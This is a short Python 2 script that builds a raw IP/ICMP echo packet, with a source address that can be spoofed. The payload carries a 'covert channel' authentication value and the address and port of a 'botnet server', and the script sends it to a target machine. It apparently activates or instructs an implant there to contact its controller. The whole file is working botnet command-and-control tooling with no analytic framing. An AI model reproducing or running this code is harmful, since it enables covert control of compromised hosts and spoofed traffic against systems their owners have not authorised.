#!/usr/bin/env python

import socket
import sys
import os
from struct import *
import time

# 192.168.121.1:8556
botnet_serv = 0xc0a87901
botnet_port = 0x216c

# Covert channel;-)
AUTH = 0x78563412

# modify the source IP and destination IP as you want:
src_ip = '192.168.121.1'
dst_ip = '192.168.121.147'

def checksum(str):
        #print "checksum"
        csum = 0
        countTo = (len(str) / 2) * 2
 
        count = 0
        while count < countTo:
                thisVal = ord(str[count+1]) * 256 + ord(str[count])
 
                csum = csum + thisVal
 
                csum = csum & 0xffffffffL #
 
                count = count + 2
 
        if countTo < len(str):
                csum = csum + ord(str[len(str) - 1])
                csum = csum & 0xffffffffL #
 
        csum = (csum >> 16) + (csum & 0xffff)
        csum = csum + (csum >> 16)
        answer = ~csum
 
        answer = answer & 0xffff
 
 
        answer = answer >> 8 | (answer << 8 & 0xff00)
 
        return answer


try:
    sd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error, msg:
    print 'Socket could not be created. Err code: ' + str(msg[0]) + ' Message ' + msg[1]
    exit()

packet = '';

# construct IP header
ip_ver = 4
ip_ihl = 5
ip_tos = 0
ip_tot_len = 0  # kernel will fill the correct total length
ip_id = 54321   #Id of this packet
ip_frag_off = 0
ip_ttl = 255
ip_proto = socket.IPPROTO_ICMP
ip_check = 0    # kernel will fill the correct checksum
ip_saddr = socket.inet_aton ( src_ip )   #Spoof the source ip address if you want to
ip_daddr = socket.inet_aton ( dst_ip )

ip_ihl_ver = (ip_ver << 4) + ip_ihl

ip_header =  pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

ID = os.getpid() & 0xffff
icmp_check = 0

# construct ICMP header
icmp_header = pack("bbHHh", 8, 0, icmp_check, ID, 1)

# payload
data = pack("!IIH", AUTH, botnet_serv, botnet_port);

#checksum
icmp_check = checksum(icmp_header + data)

icmp_check = socket.htons(icmp_check)

icmp_header = pack("bbHHh", 8, 0, icmp_check, ID, 1)

# This is our customized packet
packet = ip_header + icmp_header + data

sd.sendto(packet, (dst_ip, 0))
